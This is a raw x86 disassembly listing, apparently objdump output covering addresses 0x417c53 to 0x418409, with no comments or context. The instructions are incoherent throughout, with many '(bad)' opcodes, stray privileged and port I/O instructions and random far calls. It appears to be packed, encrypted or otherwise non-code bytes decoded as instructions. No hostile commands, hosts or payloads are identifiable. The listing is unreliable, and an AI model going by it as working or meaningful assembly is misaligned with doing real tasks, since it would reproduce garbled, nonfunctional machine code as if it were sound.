  417c53:	xchg   esi,eax
  417c54:	fldenv [esi-0x5b]
  417c57:	xor    eax,0xf753ba6c
  417c5c:	(bad)  
  417c5e:	adc    edi,DWORD PTR [edi-0x27ee771a]
  417c64:	mov    DWORD PTR [eax],0xaf1f1d8f
  417c6a:	sar    DWORD PTR [ecx],cl
  417c6c:	dec    eax
  417c6d:	les    eax,FWORD PTR [ecx+0x29]
  417c70:	lods   eax,DWORD PTR ds:[esi]
  417c71:	pop    esi
  417c72:	rcl    BYTE PTR [ecx+0x5a],1
  417c75:	std    
  417c76:	(bad)  
  417c77:	xchg   edi,eax
  417c78:	dec    eax
  417c79:	loopne 0x417c6e
  417c7b:	bnd call DWORD PTR [ebx-0x322c6876]
  417c82:	fucom  st(6)
  417c84:	cld    
  417c85:	jge    0x417ca3
  417c87:	sbb    esp,eax
  417c89:	(bad)  
  417c8a:	or     eax,DWORD PTR ss:[ebp+0x7eee1e17]
  417c91:	enter  0x3a71,0x60
  417c95:	mov    al,0x47
  417c97:	pop    ecx
  417c98:	sub    edx,ebp
  417c9a:	repnz pop ebp
  417c9c:	std    
  417c9d:	je     0x417cfc
  417c9f:	(bad)  
  417ca1:	out    dx,al
  417ca2:	xchg   ebp,eax
  417ca3:	inc    eax
  417ca4:	shr    DWORD PTR [ebx],1
  417ca6:	sbb    eax,0x398b7f12
  417cab:	ss sbb eax,0x8a65f525
  417cb1:	cld    
  417cb2:	sub    esp,DWORD PTR [esi+edx*2-0x66e69fd]
  417cb9:	(bad)  
  417cbb:	sahf   
  417cbc:	sub    al,0x35
  417cbe:	mov    dl,0xdf
  417cc0:	adc    DWORD PTR [edx-0x2823a5dd],edx
  417cc6:	sub    BYTE PTR [esi+0x1451405e],0x8e
  417ccd:	(bad)  
  417cce:	jae    0x417d1f
  417cd0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417cd1:	pop    ecx
  417cd2:	push   ebp
  417cd3:	sbb    ch,dh
  417cd5:	pop    esp
  417cd6:	push   esi
  417cd7:	fadd   DWORD PTR [edx-0x45]
  417cda:	xor    eax,0x8dc4150d
  417cdf:	adc    DWORD PTR [esi+0x33],esp
  417ce2:	jl     0x417c98
  417ce4:	add    al,0xbd
  417ce6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417ce7:	jne    0x417cf1
  417ce9:	ret    0xbf06
  417cec:	sub    eax,0x639cae4
  417cf2:	mov    bl,0x48
  417cf4:	lds    esi,FWORD PTR [eax+eiz*2-0x69b50717]
  417cfb:	icebp  
  417cfc:	pushf  
  417cfd:	ins    DWORD PTR es:[edi],dx
  417cfe:	pop    eax
  417cff:	and    eax,0xa8efca59
  417d04:	mov    bl,0xbc
  417d06:	and    esi,DWORD PTR [edi]
  417d08:	mov    fs,WORD PTR [edi+0x6d55377d]
  417d0e:	in     eax,0xe1
  417d10:	mov    ?,WORD PTR [eax+0x1b3aa8f8]
  417d16:	jecxz  0x417d7b
  417d18:	sar    DWORD PTR [edx],0x74
  417d1b:	xchg   esp,eax
  417d1c:	adc    bl,ch
  417d1e:	cmp    DWORD PTR ds:0x5214b1cd,esp
  417d24:	cmp    eax,esp
  417d26:	scas   al,BYTE PTR es:[edi]
  417d27:	mul    BYTE PTR [eax]
  417d29:	jl     0x417d2b
  417d2b:	test   al,0xb6
  417d2d:	fdiv   st(1),st
  417d2f:	mov    WORD PTR [ebx-0x2e],?
  417d32:	int3   
  417d33:	jl     0x417dab
  417d35:	enter  0xbeee,0x77
  417d39:	and    ebx,DWORD PTR [eax]
  417d3b:	push   ebx
  417d3c:	scas   al,BYTE PTR es:[edi]
  417d3d:	pop    ss
  417d3e:	in     al,dx
  417d3f:	push   ecx
  417d40:	rol    DWORD PTR [ebp+0x46c548ea],cl
  417d46:	cmp    ebp,DWORD PTR [edx+0x25fcfd46]
  417d4c:	cmp    bl,BYTE PTR [ecx+0x3f610fa0]
  417d52:	adc    eax,0x1365f1b0
  417d57:	add    esp,edx
  417d59:	nop
  417d5a:	pop    ebx
  417d5b:	cli    
  417d5c:	sub    DWORD PTR [esi],0xc6e3757
  417d62:	jb     0x417da8
  417d64:	add    al,0xea
  417d66:	xor    ch,BYTE PTR [ebx-0x2c]
  417d69:	(bad)  
  417d6a:	mov    bh,0x64
  417d6c:	pop    edi
  417d6d:	sar    BYTE PTR [edi+0x62],cl
  417d70:	mov    cl,0x47
  417d72:	sbb    ch,BYTE PTR [ebx+0x3562552d]
  417d78:	sbb    eax,DWORD PTR [ebx-0x5a]
  417d7b:	and    DWORD PTR [ebp-0xd86b28e],0xffffffaf
  417d82:	ins    DWORD PTR es:[edi],dx
  417d83:	(bad)  
  417d84:	aas    
  417d85:	retf   0x54fb
  417d88:	mov    ebp,0xdfcdb905
  417d8d:	fabs   
  417d8f:	mov    BYTE PTR [edi+0x9d4d461],bh
  417d95:	sbb    eax,0xa1fa7703
  417d9a:	mov    esp,0xdb9f6837
  417d9f:	test   dh,al
  417da1:	jae    0x417d92
  417da3:	jo     0x417d35
  417da5:	sbb    eax,0xcaf7f456
  417daa:	mov    dl,0x66
  417dac:	mov    WORD PTR [ebp+0x3],ds
  417daf:	inc    eax
  417db0:	xor    ecx,DWORD PTR [ecx]
  417db2:	or     eax,0x87ac8395
  417db7:	(bad)  
  417db8:	outs   dx,BYTE PTR ds:[esi]
  417db9:	scas   al,BYTE PTR es:[edi]
  417dba:	sahf   
  417dbb:	mov    edx,0xecb5ec2d
  417dc0:	xlat   BYTE PTR ds:[ebx]
  417dc1:	int3   
  417dc2:	adc    al,0x49
  417dc4:	imul   esi,DWORD PTR [ebx-0x2],0x4dd2fe04
  417dcb:	or     DWORD PTR [ecx-0x22],esp
  417dce:	fisub  WORD PTR [edx]
  417dd0:	xlat   BYTE PTR ds:[ebx]
  417dd1:	(bad)  
  417dd2:	mov    al,ds:0x8e56fcc8
  417dd7:	jmp    0x417df4
  417dd9:	in     eax,dx
  417dda:	les    ebx,FWORD PTR [ebx]
  417ddc:	adc    dh,BYTE PTR [edx+esi*8]
  417ddf:	addr16 fwait
  417de1:	sub    ch,BYTE PTR [ebp+0x13199c4d]
  417de7:	jge    0x417e40
  417de9:	jle    0x417d7f
  417deb:	shl    BYTE PTR [ebx-0x7c90a833],cl
  417df1:	inc    ebx
  417df2:	test   al,0x18
  417df4:	bound  eax,QWORD PTR [ecx]
  417df6:	ret    
  417df7:	push   ecx
  417df8:	int    0xfc
  417dfa:	loope  0x417e27
  417dfc:	fwait
  417dfd:	jbe    0x417d82
  417dff:	add    al,0x10
  417e01:	xor    edi,ebp
  417e03:	mov    dh,0x7f
  417e05:	inc    edx
  417e06:	aam    0x10
  417e08:	mul    DWORD PTR ds:0x960ba0f0
  417e0e:	and    BYTE PTR [ebp-0x4a],bh
  417e11:	stos   DWORD PTR es:[edi],eax
  417e12:	loop   0x417db4
  417e14:	pop    esp
  417e15:	and    BYTE PTR [ecx+0x18],0xad
  417e19:	das    
  417e1a:	cmp    eax,0x25efe09f
  417e1f:	pop    ds
  417e20:	push   edi
  417e21:	push   ebp
  417e22:	or     esi,ebp
  417e24:	add    ebp,ecx
  417e26:	enter  0x52e4,0x11
  417e2a:	sbb    al,0xbd
  417e2c:	pop    ss
  417e2d:	jno    0x417e5b
  417e2f:	jno    0x417e51
  417e31:	mov    cl,0x8a
  417e33:	sbb    edx,DWORD PTR [edx]
  417e35:	push   0xffffffda
  417e37:	add    cl,bl
  417e39:	adc    eax,DWORD PTR [edx]
  417e3b:	icebp  
  417e3c:	sbb    BYTE PTR [eax],ch
  417e3e:	fst    QWORD PTR [ecx+0x58]
  417e41:	inc    eax
  417e42:	cmp    BYTE PTR [edi],0xfc
  417e45:	lds    edi,FWORD PTR [eax-0x3ac26e07]
  417e4b:	cwde   
  417e4c:	fwait
  417e4d:	xchg   edx,eax
  417e4e:	and    BYTE PTR [ecx+0x310ccfe],al
  417e54:	sbb    al,BYTE PTR [ecx+ecx*2]
  417e57:	dec    esp
  417e58:	add    al,0xc9
  417e5a:	idiv   DWORD PTR [eax-0x287b33fd]
  417e60:	scas   al,BYTE PTR es:[edi]
  417e61:	mov    ch,0x3d
  417e63:	dec    edx
  417e64:	xor    al,dh
  417e66:	or     dl,BYTE PTR [edx+0x15b84507]
  417e6c:	dec    eax
  417e6d:	(bad)  
  417e6e:	stos   DWORD PTR es:[edi],eax
  417e6f:	es jb  0x417e25
  417e72:	sub    BYTE PTR [ecx-0x7f],0xe5
  417e76:	test   ebx,0xbdfa17db
  417e7c:	pop    edx
  417e7d:	push   ecx
  417e7e:	rcl    DWORD PTR [eax+eiz*1+0x1a],cl
  417e82:	mov    cl,0x76
  417e84:	mov    ds:0xc5877336,eax
  417e89:	inc    esi
  417e8a:	test   BYTE PTR [edx],bl
  417e8c:	xchg   ebx,eax
  417e8d:	cmp    ebp,edi
  417e8f:	test   WORD PTR [esi+0x3646edc5],si
  417e96:	push   ss
  417e97:	mov    ds:0xeaa0d1e8,al
  417e9c:	sub    ch,BYTE PTR [edx+edi*8]
  417e9f:	xor    dh,dh
  417ea1:	fimul  WORD PTR [ebx-0x754de963]
  417ea7:	pop    edx
  417ea8:	js     0x417e84
  417eaa:	jno    0x417f1c
  417eac:	jmp    0x417ebf
  417eae:	push   ecx
  417eaf:	iret   
  417eb0:	jg     0x417e6f
  417eb2:	enter  0x7fb7,0x9f
  417eb6:	dec    edi
  417eb7:	lahf   
  417eb8:	sub    eax,0x27b1d56b
  417ebd:	adc    BYTE PTR [ebx-0x2a],cl
  417ec0:	xor    ah,al
  417ec2:	adc    eax,0xda703d32
  417ec7:	push   ss
  417ec8:	pop    edx
  417ec9:	mov    dl,0x2e
  417ecb:	mov    dh,0xc0
  417ecd:	xlat   BYTE PTR ds:[ebx]
  417ece:	add    DWORD PTR [ebx+edi*8],esp
  417ed1:	dec    edi
  417ed2:	add    edi,DWORD PTR es:[esi]
  417ed5:	shl    al,cl
  417ed7:	sbb    ah,dl
  417ed9:	mov    al,ds:0x628a98a3
  417ede:	ret    0xf085
  417ee1:	cmc    
  417ee2:	or     BYTE PTR [eax],0x86
  417ee5:	sub    eax,0x20f6371b
  417eea:	ret    
  417eeb:	mov    al,ds:0x564102ec
  417ef0:	int3   
  417ef1:	hlt    
  417ef2:	pop    esi
  417ef3:	adc    dh,BYTE PTR [edi]
  417ef5:	gs int3 
  417ef7:	fcomp  DWORD PTR [edi]
  417ef9:	lea    esi,[ebx+0x37]
  417efc:	ret    
  417efd:	cmp    BYTE PTR [ebx],dh
  417eff:	fs mov ebp,0x47fb496e
  417f05:	jns    0x417f1c
  417f07:	mov    ebx,0xb379438d
  417f0c:	leave  
  417f0d:	repnz les edi,FWORD PTR [edx-0x7f1b178c]
  417f14:	aaa    
  417f15:	sar    BYTE PTR ds:0x2e792516,1
  417f1b:	mov    ah,0xbc
  417f1d:	rcl    BYTE PTR [edi],0xd4
  417f20:	(bad)  
  417f21:	mov    cl,0x84
  417f23:	rcl    BYTE PTR [esi-0x4daa71d],cl
  417f29:	and    cl,0xd4
  417f2c:	sti    
  417f2d:	mov    edx,0xa78d5ff
  417f32:	lahf   
  417f33:	mov    dh,0xd9
  417f35:	inc    esp
  417f36:	jp     0x417f72
  417f38:	sub    BYTE PTR [ecx],dl
  417f3a:	sub    eax,0x2b0b944f
  417f3f:	in     eax,0x16
  417f41:	push   es
  417f42:	mov    ebp,0x5a0a8269
  417f47:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417f48:	mov    bl,0xaa
  417f4a:	jge    0x417fa2
  417f4c:	sub    ecx,DWORD PTR [edi]
  417f4e:	pushf  
  417f4f:	cli    
  417f50:	pop    esp
  417f51:	jecxz  0x417f68
  417f53:	ja     0x417f66
  417f55:	nop
  417f56:	into   
  417f57:	or     dh,BYTE PTR [edi-0x22]
  417f5a:	fisubr WORD PTR ds:0xcdbbdae5
  417f60:	hlt    
  417f61:	and    al,0x91
  417f63:	aam    0x9a
  417f65:	push   ds
  417f66:	mov    edi,gs
  417f68:	fsubr  QWORD PTR [esp+esi*8]
  417f6b:	sub    bh,BYTE PTR [esi+0xf81da6]
  417f71:	lea    ebp,[ebx]
  417f73:	lock les edi,FWORD PTR [eax-0x98eec5f]
  417f7a:	sbb    edi,esp
  417f7c:	pop    es
  417f7d:	add    ebx,DWORD PTR [ebx]
  417f7f:	fs int 0xd9
  417f82:	fmul   QWORD PTR [esi-0x38]
  417f85:	mov    BYTE PTR [esi-0x6316ae93],0x38
  417f8c:	xchg   BYTE PTR ds:0x9221d5cf,dl
  417f92:	and    dh,BYTE PTR [esi-0x61146f17]
  417f98:	jno    0x417f2a
  417f9a:	pop    ss
  417f9b:	pushf  
  417f9c:	aad    0xe8
  417f9e:	mov    ah,0x56
  417fa0:	xchg   edx,eax
  417fa1:	retf   0x6379
  417fa4:	jmp    0x417fcf
  417fa6:	out    dx,eax
  417fa7:	imul   ecx,DWORD PTR [esp+eiz*4-0x52bdc966],0x24
  417faf:	or     BYTE PTR [ebx+ebp*4+0x191007de],bl
  417fb6:	retf   0x8b9a
  417fb9:	dec    edx
  417fba:	shr    BYTE PTR [edi+0x71],cl
  417fbd:	cld    
  417fbe:	sbb    BYTE PTR [ecx+0x55],ah
  417fc1:	push   es
  417fc2:	leave  
  417fc3:	retf   0x821c
  417fc6:	cmc    
  417fc7:	adc    eax,0x74fea7dc
  417fcc:	mov    al,0x89
  417fce:	lods   al,BYTE PTR ds:[esi]
  417fcf:	and    dh,BYTE PTR [eax]
  417fd1:	mov    WORD PTR [ebx+0x50fceaea],cs
  417fd7:	xchg   ecx,eax
  417fd8:	push   eax
  417fd9:	stos   BYTE PTR es:[edi],al
  417fda:	adc    BYTE PTR [eiz*4-0x48c290da],0xcc
  417fe2:	inc    eax
  417fe3:	pop    edi
  417fe4:	cs int 0x79
  417fe7:	in     eax,dx
  417fe8:	mov    edx,0x25e5051
  417fed:	stos   DWORD PTR es:[edi],eax
  417fee:	and    DWORD PTR [ecx-0x4c],ebx
  417ff1:	outs   dx,DWORD PTR ds:[esi]
  417ff2:	adc    dl,ah
  417ff4:	mov    ah,0xef
  417ff6:	cmp    DWORD PTR [edi],esi
  417ff8:	lods   eax,DWORD PTR ds:[esi]
  417ff9:	scas   al,BYTE PTR es:[edi]
  417ffa:	push   ecx
  417ffb:	sbb    ecx,0xbc1c77e7
  418001:	js     0x418047
  418003:	scas   al,BYTE PTR es:[edi]
  418004:	and    ebx,edx
  418006:	clc    
  418007:	mov    esi,0x4ba58e1f
  41800c:	imul   DWORD PTR [edx+0x4ed34dd3]
  418012:	pusha  
  418013:	popa   
  418014:	pop    ss
  418015:	cmc    
  418016:	ins    DWORD PTR es:[edi],dx
  418017:	retf   0x73c7
  41801a:	ficom  WORD PTR [ecx]
  41801c:	pop    ebx
  41801d:	mov    ah,0x93
  41801f:	cwde   
  418020:	jmp    0x41800e
  418022:	mov    ds:0xdb2f7f6d,al
  418027:	ficomp WORD PTR ds:[edi]
  41802a:	addr16 mov edx,0xb63d42d5
  418030:	mov    al,ds:0x370f0841
  418035:	test   DWORD PTR [edx+ebp*2+0x17],ecx
  418039:	(bad)  
  41803a:	xor    al,0x4d
  41803c:	fistp  DWORD PTR [eax+0x204256f1]
  418042:	and    al,BYTE PTR [eax+0x76885368]
  418048:	jmp    0xc81b5cf4
  41804d:	jns    0x418051
  41804f:	inc    edi
  418050:	sub    BYTE PTR [edi],ch
  418052:	mov    eax,esp
  418054:	push   0xffbdd607
  418059:	ins    DWORD PTR es:[edi],dx
  41805a:	push   esi
  41805b:	mov    ecx,0x4f373a1e
  418060:	or     eax,0xab31a3c8
  418065:	(bad)  
  418066:	in     eax,dx
  418067:	cmp    al,0xd8
  418069:	popa   
  41806a:	mov    ecx,0x4955115d
  41806f:	dec    ebx
  418070:	and    bl,BYTE PTR [edx+0xd]
  418073:	dec    DWORD PTR [edi]
  418075:	or     eax,DWORD PTR [edi+0x54]
  418078:	mov    bh,0xb
  41807a:	pop    ebp
  41807b:	cmp    esi,DWORD PTR [ecx+0x6c]
  41807e:	mov    al,0xda
  418080:	jp     0x418098
  418082:	mov    dl,0x87
  418084:	jecxz  0x41803e
  418086:	loopne 0x418077
  418088:	cmp    eax,DWORD PTR [ecx-0x4e]
  41808b:	sub    bh,BYTE PTR [eax-0x38]
  41808e:	inc    edi
  41808f:	mov    ds:0x61b9a811,eax
  418094:	sub    bl,cl
  418096:	loop   0x41804e
  418098:	mov    es,WORD PTR [edx-0x473f8327]
  41809e:	in     eax,0xc9
  4180a0:	inc    edx
  4180a1:	jge    0x4180d3
  4180a3:	sbb    al,BYTE PTR [eax-0x126dbf74]
  4180a9:	dec    edx
  4180aa:	bound  esi,QWORD PTR [ecx]
  4180ac:	jl     0x418049
  4180ae:	stos   BYTE PTR es:[edi],al
  4180af:	mov    bl,0xdd
  4180b1:	sub    edi,edi
  4180b3:	xchg   BYTE PTR [ebp+0x6c],ch
  4180b6:	jmp    0x41809c
  4180b8:	imul   eax,DWORD PTR [edi+0x1a35904f],0xffffffb2
  4180bf:	jle    0x4180a3
  4180c1:	pushf  
  4180c2:	add    bh,BYTE PTR [ecx+esi*1+0x45]
  4180c6:	sahf   
  4180c7:	pusha  
  4180c8:	sti    
  4180c9:	dec    eax
  4180ca:	sbb    bl,BYTE PTR [edi-0x5]
  4180cd:	dec    eax
  4180ce:	sub    eax,0xac72a309
  4180d3:	and    bh,BYTE PTR [ebx]
  4180d5:	mov    bh,0x38
  4180d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4180d8:	les    edx,FWORD PTR [esi+0x479ee239]
  4180de:	in     al,dx
  4180df:	es repnz stc 
  4180e2:	dec    esp
  4180e3:	loope  0x4180d1
  4180e5:	adc    cl,BYTE PTR [ebx-0x46]
  4180e8:	mov    ch,0xef
  4180ea:	dec    edx
  4180eb:	fimul  WORD PTR [eax-0x5e]
  4180ee:	dec    ebp
  4180ef:	mov    bl,0x33
  4180f1:	and    al,0x81
  4180f3:	lods   al,BYTE PTR ds:[esi]
  4180f4:	xor    BYTE PTR [ecx-0x3746530f],dl
  4180fa:	sbb    eax,0xa9e98cc2
  4180ff:	mov    ds:0xa6817d0b,eax
  418104:	cmp    al,0x26
  418106:	in     al,dx
  418107:	aad    0xc3
  418109:	jp     0x4180fc
  41810b:	fiadd  WORD PTR [esi+0x5cb2c703]
  418111:	fnstsw WORD PTR [ebp+ebp*1-0x74b76ee0]
  418118:	mov    dl,0xb3
  41811a:	jo     0x418116
  41811c:	mov    al,ds:0xe5ed1bc6
  418121:	retf   0x7431
  418124:	push   ebx
  418125:	inc    edx
  418126:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418127:	xor    eax,0x41ade456
  41812c:	xchg   cl,dh
  41812e:	mov    eax,0x7b01ae05
  418133:	add    BYTE PTR [esi-0x55],al
  418136:	aam    0x40
  418138:	out    0xcf,al
  41813a:	data16 lahf 
  41813c:	shl    DWORD PTR [edi],1
  41813e:	cmp    DWORD PTR [edi],edi
  418140:	mov    fs,WORD PTR [ebx-0x5]
  418143:	daa    
  418144:	xor    dh,BYTE PTR [edi-0x543c9672]
  41814a:	mov    eax,ds:0xdf5984dc
  41814f:	fidivr WORD PTR [esi]
  418151:	scas   eax,DWORD PTR es:[edi]
  418152:	mov    dh,0x9d
  418154:	xor    esp,DWORD PTR [esi]
  418156:	test   eax,0x36d504c6
  41815b:	xor    BYTE PTR [ebp-0x7],al
  41815e:	fadd   DWORD PTR [eax]
  418160:	mov    ebp,0xfc3aafd2
  418165:	aas    
  418166:	or     DWORD PTR [ebx],0x7b
  418169:	fcmovnb st,st(2)
  41816b:	mov    esi,0xec167d4a
  418170:	add    bh,BYTE PTR [eax]
  418172:	jl     0x41810f
  418174:	mov    eax,ds:0x6d381f31
  418179:	out    dx,al
  41817a:	jb     0x418114
  41817c:	jl     0x41816c
  41817e:	xor    al,0x8c
  418180:	int3   
  418181:	jmp    0x418197
  418183:	sub    al,0x5f
  418185:	(bad)  
  418186:	gs xchg esi,eax
  418188:	cli    
  418189:	sar    BYTE PTR [ebx+ecx*2-0x4d8d9e78],1
  418190:	jecxz  0x418120
  418192:	add    al,0x43
  418194:	jge    0x418147
  418196:	outs   dx,BYTE PTR ds:[esi]
  418197:	gs call 0x156b9dd8
  41819d:	call   0x9532:0x7439c343
  4181a4:	mov    edi,0x8a2b3390
  4181a9:	dec    esi
  4181aa:	(bad)
  4181ae:	add    edi,DWORD PTR [ebx+esi*4-0x2ebe9c4f]
  4181b5:	(bad)  
  4181b7:	es push 0xb1c4d9a1
  4181bd:	inc    ecx
  4181be:	test   al,0x9f
  4181c0:	cdq    
  4181c1:	test   al,0x61
  4181c3:	rol    DWORD PTR [ebp+0x50],0x9f
  4181c7:	mov    BYTE PTR [ebp-0x6d34f9cc],ah
  4181cd:	sub    BYTE PTR [ebp+0x0],bh
  4181d0:	cmp    bh,bh
  4181d2:	or     al,0x69
  4181d4:	dec    esp
  4181d5:	jge    0x4181c7
  4181d7:	sti    
  4181d8:	out    0xfc,al
  4181da:	gs cld 
  4181dc:	xchg   ebx,eax
  4181dd:	gs in  al,dx
  4181df:	pusha  
  4181e0:	xor    DWORD PTR [edx-0x6dbc9753],0x7
  4181e7:	dec    ebx
  4181e8:	xor    BYTE PTR [edi+0x28],bl
  4181eb:	lods   al,BYTE PTR ds:[esi]
  4181ec:	pop    ebx
  4181ed:	push   0xfffffffc
  4181ef:	jae    0x41823f
  4181f1:	sub    eax,0xdabcb20c
  4181f6:	ret    0x3e49
  4181f9:	xchg   ebp,eax
  4181fa:	cld    
  4181fb:	out    dx,al
  4181fc:	inc    ebp
  4181fd:	and    DWORD PTR [edi],edi
  4181ff:	push   edx
  418201:	inc    esi
  418202:	or     BYTE PTR [edx],dh
  418204:	jb     0x418236
  418206:	mov    dh,0x5f
  418208:	xchg   edx,eax
  418209:	xchg   edx,eax
  41820a:	jo     0x418224
  41820c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41820d:	in     al,0x34
  41820f:	jbe    0x418284
  418211:	daa    
  418212:	add    cl,BYTE PTR [edx-0x6c81529a]
  418218:	sbb    BYTE PTR [ecx],bh
  41821a:	mov    edi,0x6e2898f5
  41821f:	ja     0x4181ad
  418221:	clc    
  418222:	imul   ecx,DWORD PTR es:[edi+0x29],0xffffff97
  418227:	sbb    al,0x5d
  418229:	lds    ebx,FWORD PTR [edi]
  41822b:	mov    ds:0x3b9c3b4b,al
  418230:	mov    al,0x70
  418232:	lahf   
  418233:	mov    eax,0x2882fe80
  418238:	punpckhbw mm6,mm1
  41823b:	sbb    eax,ebx
  41823d:	mov    ah,0x7d
  41823f:	ss dec edx
  418241:	pop    bp
  418243:	pop    ebp
  418244:	sbb    esp,DWORD PTR [edx]
  418246:	cmp    ebx,0x2f
  418249:	sub    eax,0x117b5ab9
  41824e:	in     eax,dx
  41824f:	bound  edi,QWORD PTR [esi+0x76]
  418252:	add    al,0x12
  418254:	xchg   ebp,eax
  418255:	ficomp DWORD PTR [edx-0x78]
  418258:	xor    eax,0xb4f56934
  41825d:	mov    ds:0xb530975e,al
  418262:	gs daa 
  418264:	xchg   dx,ax
  418266:	xor    al,0x18
  418268:	stc    
  418269:	mov    ds:0x332cb24d,eax
  41826e:	mov    cs,ebp
  418270:	dec    BYTE PTR [eax-0x40]
  418273:	add    edi,DWORD PTR [ecx-0x4b66a63a]
  418279:	jp     0x4182b0
  41827b:	js     0x4182af
  41827d:	shl    edx,0x53
  418280:	inc    ebp
  418281:	xchg   ecx,eax
  418282:	scas   eax,DWORD PTR es:[edi]
  418283:	lea    ebx,[edx]
  418285:	cmp    bl,0x28
  418288:	fsubr  DWORD PTR [esi+0x2]
  41828b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41828c:	or     DWORD PTR [edx-0x162e3328],0x1e
  418293:	lods   al,BYTE PTR ds:[esi]
  418294:	xchg   esp,eax
  418295:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418296:	aad    0xf7
  418298:	xchg   ebp,eax
  418299:	jp     0x4182c2
  41829b:	ret    0x6017
  41829e:	fbstp  TBYTE PTR [edi-0x40]
  4182a1:	mov    ah,0xf9
  4182a3:	lahf   
  4182a4:	mov    ebx,0x7dfc9022
  4182a9:	shr    DWORD PTR [ebp+0x69bbfc8a],1
  4182af:	ret    0x45b6
  4182b2:	or     cl,BYTE PTR [edx+0x18d0d509]
  4182b8:	lock stc 
  4182ba:	stos   BYTE PTR es:[edi],al
  4182bb:	push   ecx
  4182bc:	adc    dh,bh
  4182be:	fisttp DWORD PTR [edi]
  4182c0:	ret    
  4182c1:	into   
  4182c2:	xor    ebx,esp
  4182c4:	sbb    DWORD PTR [edx+0x1d],ecx
  4182c7:	ss pop es
  4182c9:	adc    DWORD PTR [ebx-0xd],0x4f
  4182cd:	push   ecx
  4182ce:	fld    QWORD PTR [esi+0x6ae26142]
  4182d4:	pushf  
  4182d5:	and    ecx,DWORD PTR [edx-0x1]
  4182d8:	push   ss
  4182d9:	addr16 mov ah,0x27
  4182dc:	add    BYTE PTR [ebx-0x5cdcb573],cl
  4182e2:	dec    esi
  4182e3:	stc    
  4182e4:	retf   
  4182e5:	sbb    esp,DWORD PTR [ebx-0x65]
  4182e8:	repnz xchg dl,ch
  4182eb:	or     esi,ecx
  4182ed:	fsub   QWORD PTR [ecx]
  4182ef:	outs   dx,BYTE PTR ds:[esi]
  4182f0:	es fcmovnb st,st(0)
  4182f3:	pop    ds
  4182f4:	mov    WORD PTR [edx+0x6],fs
  4182f7:	fild   DWORD PTR [esi+0x6f5fb88a]
  4182fd:	push   esp
  4182fe:	mov    esp,0xb5bc95c8
  418303:	lods   eax,DWORD PTR ds:[esi]
  418304:	xchg   ecx,eax
  418305:	pop    ebx
  418306:	inc    edi
  418307:	in     al,0x42
  418309:	inc    eax
  41830a:	int3   
  41830b:	(bad)  
  41830d:	or     eax,0x48ef0657
  418312:	lods   al,BYTE PTR ds:[esi]
  418313:	add    al,0xf8
  418315:	fadd   QWORD PTR [edi]
  418317:	sbb    ecx,DWORD PTR [ecx+0x18a99efc]
  41831d:	push   ebp
  41831e:	loop   0x418313
  418320:	ds fxch st(6)
  418323:	loop   0x418376
  418325:	not    BYTE PTR [eax]
  418327:	ja     0x418333
  418329:	jae    0x4182b0
  41832b:	or     ecx,esp
  41832d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41832e:	mov    esi,0xea23cce7
  418333:	jbe    0x418360
  418335:	mov    ch,0x5c
  418337:	les    edx,FWORD PTR [eax+0x65]
  41833a:	xor    al,0x4b
  41833c:	add    BYTE PTR [ecx+0x67],bl
  41833f:	loop   0x418315
  418341:	pop    es
  418342:	adc    DWORD PTR [ebp+ebx*2+0x32],ebp
  418346:	or     al,0x87
  418348:	inc    edi
  418349:	das    
  41834a:	outs   dx,DWORD PTR ds:[esi]
  41834b:	mov    ds:0x60e68fb6,eax
  418350:	mov    dh,0x4e
  418352:	pop    edi
  418353:	test   DWORD PTR [eax],ebx
  418355:	pop    ecx
  418356:	inc    edi
  418357:	hlt    
  418358:	or     bh,BYTE PTR [ebp+0x629f516e]
  41835e:	adc    ebp,DWORD PTR [ebp-0x20a429f5]
  418364:	sub    DWORD PTR [eax],esi
  418366:	sbb    esp,0xaa6a86e4
  41836c:	adc    BYTE PTR [edx],dl
  41836e:	cli    
  41836f:	mov    bl,0xdc
  418371:	ret    
  418372:	leave  
  418373:	shl    ecx,cl
  418375:	and    al,0x2d
  418377:	add    dl,BYTE PTR [edx-0x190acf72]
  41837d:	cmp    eax,0x71db3caf
  418382:	pushf  
  418383:	retf   0x8034
  418386:	leave  
  418387:	lock sub eax,0xf343954a
  41838d:	lds    ebx,FWORD PTR [edx-0x1ca9d970]
  418393:	and    bl,al
  418395:	push   eax
  418396:	pop    ebp
  418397:	or     ebp,DWORD PTR [esi-0x14]
  41839a:	das    
  41839b:	fchs   
  41839d:	adc    ecx,ebp
  41839f:	clc    
  4183a0:	mov    cl,0x9f
  4183a2:	adc    BYTE PTR [edi-0x55],dh
  4183a5:	out    0xde,al
  4183a7:	inc    eax
  4183a8:	xor    edx,DWORD PTR [eax]
  4183aa:	adc    DWORD PTR [ecx-0x5f],edx
  4183ad:	add    ah,dh
  4183af:	mov    ds:0xde932189,al
  4183b4:	cmp    al,0xb6
  4183b6:	sbb    eax,0x79e6b8ff
  4183bb:	leave  
  4183bc:	add    ecx,DWORD PTR [edi]
  4183be:	leave  
  4183bf:	jo     0x418430
  4183c1:	mov    ah,0xdd
  4183c3:	sti    
  4183c4:	dec    ebp
  4183c5:	jl     0x418413
  4183c7:	and    ebp,0x21
  4183ca:	jmp    0x41839d
  4183cc:	mov    bl,0x55
  4183ce:	test   ah,0x9c
  4183d1:	aam    0x24
  4183d3:	jp     0x4183ae
  4183d5:	pop    ebx
  4183d6:	sub    dh,bl
  4183d8:	repz cdq 
  4183da:	mov    ah,0xe3
  4183dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4183dd:	dec    esp
  4183de:	jno    0x418419
  4183e0:	ss std 
  4183e2:	mov    ecx,0x2751e05b
  4183e7:	pop    edx
  4183e8:	dec    edi
  4183e9:	inc    edi
  4183ea:	or     bl,BYTE PTR [esi-0x4bd0cab1]
  4183f0:	inc    esi
  4183f1:	inc    esp
  4183f2:	test   al,0x43
  4183f4:	jl     0x418407
  4183f6:	leave  
  4183f7:	mov    ebx,0x776e3c6b
  4183fc:	rcl    dl,cl
  4183fe:	je     0x418407
  418400:	mov    dl,0x44
  418402:	or     al,BYTE PTR [eax+0x5b]
  418405:	jle    0x418479
  418407:	mov    ch,0x9f
  418409:	(bad)  
